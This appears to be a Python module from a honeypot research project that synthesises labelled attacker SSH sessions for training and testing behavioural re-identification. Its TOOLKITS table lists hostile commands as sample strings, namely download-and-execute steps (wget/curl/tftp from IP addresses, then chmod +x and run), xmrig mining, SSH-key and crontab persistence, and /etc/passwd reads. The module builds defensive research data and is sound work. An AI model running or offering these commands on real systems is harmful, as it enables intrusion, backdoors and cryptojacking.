"""Identity-labelled session corpora for re-identification training and eval.

Re-identification needs something neither Cowrie nor the Phase-2 tool-signature
weak labels provide: **multiple sessions per individual attacker**. The unit of
ground truth here is the *identity* -- the same actor returning across several
reconnections -- not the session and not the tool family. This module synthesises
exactly that, so the whole Phase-3 stack (training, recall@k, ablations,
adversarial robustness, fingerprinting) is runnable and testable with **no
external data**, and so the paper's claims can be validated against a known
generative process before being re-run on real captures.

Generative model (the BCI analogy made literal)
-----------------------------------------------
Each **identity** is the analogue of a single recorded **neuron**: it has a
stable latent "tuning" that nonetheless produces variable observations from trial
to trial. Concretely an identity is drawn once and fixes

* a **toolkit** -- the command vocabulary it draws from (recon / dropper / miner /
  persistence). This is the coarse, shared structure -- the analogue of a cell
  *type*. Re-identifying the toolkit is the easy problem; re-identifying the
  individual *within* a toolkit is the hard one, and the generator makes both
  measurable.
* a **command-preference distribution** over that toolkit (a personal Dirichlet
  draw) plus 0-2 idiosyncratic commands borrowed from other toolkits -- the
  individual fingerprint, the analogue of a neuron's specific tuning curve.
* a **timing cadence** -- a personal mean inter-command interval and a coefficient
  of variation (regularity). Low CV == metronomic/scripted; high CV ==
  bursty/human. This is the ISI-statistics half of the identity.

Each **session** is one **trial**: the identity is sampled stochastically
(different length, a fresh command draw, log-normal ICI noise, a *fresh random
source IP*), so two sessions of one identity are similar-but-not-identical -- the
"identity persists through behavioural drift and partial observation" regime that
makes re-ID non-trivial. The source IP is deliberately re-randomised every session
so nothing can re-identify on network address; identity must be recovered from
*behaviour* alone.
"""

from __future__ import annotations

import math
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone

from ..data.schema import Command, Session

__all__ = [
    "TOOLKITS",
    "IdentityProfile",
    "IdentityCorpus",
    "make_identity_corpus",
    "reconnection_split",
]

#: Command pools per simulated toolkit. Pools overlap deliberately (e.g.
#: ``cat /proc/cpuinfo`` appears in both recon and miner) so toolkit boundaries
#: are fuzzy and re-ID cannot trivially separate identities by vocabulary alone.
#: On real captures these labels would instead come from
#: :func:`mirage.viz.tool_signature.infer_tool_signature` (or a malware-family
#: oracle such as Metasploit vs Cobalt Strike); the rest of Phase 3 is
#: label-source agnostic.
TOOLKITS: dict[str, tuple[str, ...]] = {
    "recon": (
        "uname -a", "whoami", "id", "cat /proc/cpuinfo", "ls -la", "w",
        "ps aux", "netstat -an", "cat /etc/passwd", "lscpu", "free -m", "df -h",
    ),
    "dropper": (
        "wget http://185.10.68.2/a", "curl -O http://185.10.68.2/b", "chmod +x a",
        "./a", "tftp -g -r c 185.10.68.2", "rm -rf a", "cat /bin/busybox", "./b",
    ),
    "miner": (
        "nproc", "./xmrig -o stratum+tcp://pool:3333 --donate-level 1",
        "cat /proc/cpuinfo", "wget http://91.92.1.7/xmrig", "chmod +x xmrig",
        "pkill -9 minerd", "free -m", "./xmrig -B",
    ),
    "persistence": (
        "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", "crontab -l",
        "useradd -m bot", "passwd", "cat ~/.ssh/authorized_keys",
        "echo '* * * * * sh' | crontab -", "chattr +i ~/.ssh/authorized_keys",
    ),
}


@dataclass
class IdentityProfile:
    """The fixed latent "tuning" of one synthetic attacker identity.

    Attributes:
        identity: Stable identity label (the re-ID ground truth).
        toolkit: Which :data:`TOOLKITS` pool this identity draws from.
        vocabulary: The identity's effective command pool (toolkit pool plus any
            borrowed idiosyncratic commands).
        weights: Personal preference distribution over ``vocabulary`` (sums to 1).
        mean_ici_ms: Personal mean inter-command interval in milliseconds.
        ici_cv: Coefficient of variation of the inter-command intervals
            (regularity); low == scripted, high == human/bursty.
        length_range: Inclusive ``(min, max)`` command count per session.
    """

    identity: str
    toolkit: str
    vocabulary: tuple[str, ...]
    weights: tuple[float, ...]
    mean_ici_ms: float
    ici_cv: float
    length_range: tuple[int, int]


@dataclass
class IdentityCorpus:
    """A corpus of sessions with aligned identity and toolkit ground truth.

    Attributes:
        sessions: The generated sessions.
        identity_labels: ``identity_labels[i]`` is the ground-truth identity of
            ``sessions[i]`` (the re-ID label).
        toolkit_labels: ``toolkit_labels[i]`` is the toolkit family of
            ``sessions[i]`` (the coarse fingerprint label).
        profiles: The latent profiles, keyed by identity, for introspection.
    """

    sessions: list[Session]
    identity_labels: list[str]
    toolkit_labels: list[str]
    profiles: dict[str, IdentityProfile] = field(default_factory=dict)

    def __len__(self) -> int:
        return len(self.sessions)

    @property
    def n_identities(self) -> int:
        return len(set(self.identity_labels))


def _sample_weights(rng: random.Random, n: int, concentration: float) -> tuple[float, ...]:
    """Draw a Dirichlet-style preference vector over ``n`` commands.

    A small ``concentration`` yields a *peaky* distribution (the identity strongly
    favours a few commands -- a sharp fingerprint); large yields near-uniform. We
    sample Gamma(concentration, 1) per command and normalise (the standard
    Dirichlet construction) using stdlib ``gammavariate`` so this stays
    numpy-free.
    """
    raw = [rng.gammavariate(concentration, 1.0) for _ in range(n)]
    total = sum(raw) or 1.0
    return tuple(x / total for x in raw)


def _build_profile(
    rng: random.Random,
    identity: str,
    toolkit: str,
    length_range: tuple[int, int],
) -> IdentityProfile:
    """Draw one identity's fixed latent profile."""
    pool = list(TOOLKITS[toolkit])
    # Borrow 0-2 idiosyncratic commands from *other* toolkits -- the personal
    # quirks that distinguish individuals sharing a toolkit.
    others = [c for name, cmds in TOOLKITS.items() if name != toolkit for c in cmds]
    n_borrow = rng.randint(0, 2)
    pool.extend(rng.sample(others, k=min(n_borrow, len(others))))
    vocab = tuple(pool)

    # Peaky personal preference (concentration < 1 => sharp fingerprint).
    weights = _sample_weights(rng, len(vocab), concentration=0.4)

    # Cadence: mean ICI log-uniform over ~150 ms (fast script) .. ~9 s (human),
    # CV in [0.2 (metronomic) .. 1.4 (bursty human)].
    mean_ici_ms = math.exp(rng.uniform(math.log(150.0), math.log(9000.0)))
    ici_cv = rng.uniform(0.2, 1.4)
    return IdentityProfile(
        identity=identity,
        toolkit=toolkit,
        vocabulary=vocab,
        weights=weights,
        mean_ici_ms=mean_ici_ms,
        ici_cv=ici_cv,
        length_range=length_range,
    )


def _lognormal_ici(rng: random.Random, mean_ms: float, cv: float) -> float:
    """Sample one inter-command interval (ms) from a log-normal with given CV.

    ISIs/ICIs are approximately log-normal, so we parameterise directly: for a
    log-normal, ``CV = sqrt(exp(sigma^2) - 1)`` => ``sigma = sqrt(log(1 + CV^2))``,
    and we set ``mu`` so the distribution's mean equals ``mean_ms``.
    """
    sigma = math.sqrt(math.log(1.0 + cv * cv))
    mu = math.log(max(mean_ms, 1.0)) - 0.5 * sigma * sigma
    return max(1.0, math.exp(rng.gauss(mu, sigma)))


def _generate_session(
    rng: random.Random,
    profile: IdentityProfile,
    session_id: str,
    base_time: datetime,
) -> Session:
    """Render one session (one "trial") from an identity profile."""
    lo, hi = profile.length_range
    length = rng.randint(lo, hi)
    commands_raw = rng.choices(profile.vocabulary, weights=profile.weights, k=length)

    # Fresh random IP every session: identity must be recovered from behaviour,
    # never from network address.
    ip = ".".join(str(rng.randint(1, 254)) for _ in range(4))
    start = base_time + timedelta(seconds=rng.uniform(0, 3600))

    commands: list[Command] = []
    offset_ms = float(rng.uniform(0, 1500))  # time-to-first-command varies per visit
    for raw in commands_raw:
        ts = start + timedelta(milliseconds=offset_ms)
        commands.append(Command(timestamp=ts, raw=raw, ms_offset=int(offset_ms)))
        offset_ms += _lognormal_ici(rng, profile.mean_ici_ms, profile.ici_cv)

    return Session(
        session_id=session_id,
        ip=ip,
        start_time=start,
        commands=commands,
        duration_ms=int(offset_ms),
    )


def make_identity_corpus(
    n_identities: int = 40,
    sessions_per_identity: int = 4,
    toolkits: tuple[str, ...] | None = None,
    length_range: tuple[int, int] = (6, 18),
    seed: int = 0,
) -> IdentityCorpus:
    """Synthesise an identity-labelled corpus for re-identification.

    Args:
        n_identities: Number of distinct attacker identities (re-ID classes).
        sessions_per_identity: Number of sessions ("reconnections") per identity.
            Must be ``>= 2`` so every identity is re-identifiable (one probe + at
            least one gallery session).
        toolkits: Which toolkit pools to draw identities from; defaults to all of
            :data:`TOOLKITS`. Identities are spread round-robin across toolkits.
        length_range: Inclusive ``(min, max)`` commands per session.
        seed: RNG seed for full reproducibility.

    Returns:
        An :class:`IdentityCorpus` whose ``sessions`` are shuffled (so identity is
        not recoverable from row order) with aligned ``identity_labels`` and
        ``toolkit_labels``.
    """
    if sessions_per_identity < 2:
        raise ValueError("need >= 2 sessions per identity for re-identification")
    kits = toolkits or tuple(TOOLKITS.keys())
    rng = random.Random(seed)
    base_time = datetime(2024, 1, 1, tzinfo=timezone.utc)

    profiles: dict[str, IdentityProfile] = {}
    sessions: list[Session] = []
    identity_labels: list[str] = []
    toolkit_labels: list[str] = []

    for k in range(n_identities):
        identity = f"id_{k:04d}"
        toolkit = kits[k % len(kits)]
        profile = _build_profile(rng, identity, toolkit, length_range)
        profiles[identity] = profile
        for s in range(sessions_per_identity):
            session = _generate_session(
                rng, profile, session_id=f"{identity}_s{s}", base_time=base_time
            )
            sessions.append(session)
            identity_labels.append(identity)
            toolkit_labels.append(toolkit)

    # Shuffle jointly so nothing downstream can exploit row order.
    order = list(range(len(sessions)))
    rng.shuffle(order)
    sessions = [sessions[i] for i in order]
    identity_labels = [identity_labels[i] for i in order]
    toolkit_labels = [toolkit_labels[i] for i in order]

    return IdentityCorpus(
        sessions=sessions,
        identity_labels=identity_labels,
        toolkit_labels=toolkit_labels,
        profiles=profiles,
    )


def reconnection_split(
    identity_labels: list[str],
    n_probe_per_identity: int = 1,
    seed: int = 0,
) -> tuple[list[int], list[int]]:
    """Split indices into a (gallery, probe) re-identification protocol.

    For each identity we hold out ``n_probe_per_identity`` sessions as **probes**
    (the "new reconnection" to be matched) and keep the rest as the enrolled
    **gallery**. Identities with too few sessions to spare a probe while keeping a
    non-empty gallery are placed entirely in the gallery (they can be matched
    *to*, just never queried). This is the standard closed-set re-ID protocol:
    every probe has at least one same-identity gallery mate, so recall@k is
    well-defined.

    Args:
        identity_labels: Per-session identity ground truth.
        n_probe_per_identity: Probes to hold out per identity.
        seed: RNG seed controlling which sessions become probes.

    Returns:
        ``(gallery_indices, probe_indices)`` into ``identity_labels``.
    """
    rng = random.Random(seed)
    by_identity: dict[str, list[int]] = {}
    for idx, identity in enumerate(identity_labels):
        by_identity.setdefault(identity, []).append(idx)

    gallery: list[int] = []
    probe: list[int] = []
    for identity, indices in by_identity.items():
        shuffled = list(indices)
        rng.shuffle(shuffled)
        n_probe = min(n_probe_per_identity, max(0, len(shuffled) - 1))
        probe.extend(shuffled[:n_probe])
        gallery.extend(shuffled[n_probe:])

    gallery.sort()
    probe.sort()
    return gallery, probe
